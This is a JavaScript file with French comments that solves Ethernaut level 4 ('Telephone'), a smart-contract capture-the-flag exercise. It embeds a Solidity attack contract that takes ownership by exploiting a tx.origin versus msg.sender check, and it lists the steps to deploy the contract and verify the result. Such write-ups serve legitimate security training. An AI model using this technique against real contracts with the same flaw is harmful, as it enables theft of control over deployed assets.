// Level 4: Telephone - Solution
// L'objectif est de devenir propriétaire en exploitant tx.origin vs msg.sender

// Contrat d'attaque déployé via Remix
const attackContractCode = `
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract TelephoneAttack {
    ITelephone telephone;
    
    constructor(address _telephoneAddress) {
        telephone = ITelephone(_telephoneAddress);
    }
    
    function attack() public {
        telephone.changeOwner(msg.sender);
    }
}
`;

// Étapes d'exploitation documentées
/*
1. Déployer le contrat d'attaque sur Remix avec l'adresse de l'instance:
   - Adresse instance: await contract.address

2. Appeler attack() pour prendre le contrôle:
   - Un seul appel nécessaire
   - Vérifier le nouveau propriétaire: await contract.owner()

3. Vérification finale:
   - Le nouveau propriétaire doit être votre adresse
   - Soumettre l'instance à Ethernaut
*/

// Commandes de vérification
(async () => {
  console.log("Propriétaire actuel:", await contract.owner());
  console.log("Notre adresse:", player);
  console.log("Sommes-nous propriétaire?:", (await contract.owner()) === player);
})();